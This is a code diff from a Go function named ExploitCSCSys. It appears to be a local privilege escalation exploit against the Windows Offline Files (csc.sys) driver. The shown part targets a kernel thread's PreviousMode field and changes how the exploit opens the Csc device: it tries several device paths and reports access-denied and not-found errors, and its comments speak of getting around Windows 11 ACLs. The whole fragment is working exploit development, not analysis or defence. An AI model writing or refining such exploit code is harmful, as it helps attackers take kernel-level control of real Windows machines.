@@ -145,20 +145,44 @@ func ExploitCSCSys() bool {
 	targetAddr := kThreadAddr + 0x232
 	fmt.Printf("[*] Target (PreviousMode): 0x%x\n", targetAddr)
 
-	// 3. Ouverture du device CSC
-	devName, _ := syscall.UTF16PtrFromString("\\\\.\\Csc")
-	hDevice, _, _ := procCreateFile.Call(
-		uintptr(unsafe.Pointer(devName)),
-		0, // Accès minimal (0) pour contourner les ACLs de Windows 11
-		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE|syscall.FILE_SHARE_DELETE,
-		0,
-		syscall.OPEN_EXISTING,
-		0,
-		0,
-	)
+	// 3. Ouverture du device CSC (Chemins multiples + Diagnostic d'erreur)
+	names := []string{"\\\\.\\Csc", "\\\\.\\GLOBALROOT\\Device\\Csc"}
+	var hDevice uintptr
+	var errOpen error
+
+	for _, name := range names {
+		devName, _ := syscall.UTF16PtrFromString(name)
+		// On capture l'erreur retournée par l'appel système
+		h, _, e := procCreateFile.Call(
+			uintptr(unsafe.Pointer(devName)),
+			0,
+			syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE|syscall.FILE_SHARE_DELETE,
+			0,
+			syscall.OPEN_EXISTING,
+			0,
+			0,
+		)
+		if h != uintptr(syscall.InvalidHandle) {
+			hDevice = h
+			fmt.Printf("[+] Device ouvert via : %s\n", name)
+			break
+		}
+		errOpen = e
+	}
 
 	if hDevice == uintptr(syscall.InvalidHandle) {
-		fmt.Println("[-] Impossible d'ouvrir \\\\.\\Csc. Vérifiez que le service Offline Files est actif.")
+		// Conversion de l'erreur en code système Windows
+		errno := uint32(errOpen.(syscall.Errno))
+		fmt.Printf("[-] Erreur système d'ouverture : %d\n", errno)
+
+		switch errno {
+		case 5:
+			fmt.Println("[!] ACCÈS REFUSÉ : Les permissions (ACL) sur ce driver sont restreintes sur cette build.")
+		case 2:
+			fmt.Println("[!] INTROUVABLE : Le service Offline Files n'expose pas de canal de communication.")
+		default:
+			fmt.Println("[!] ERREUR INCONNUE : Le driver refuse la communication.")
+		}
 		return false
 	}
 	defer syscall.CloseHandle(syscall.Handle(hDevice))
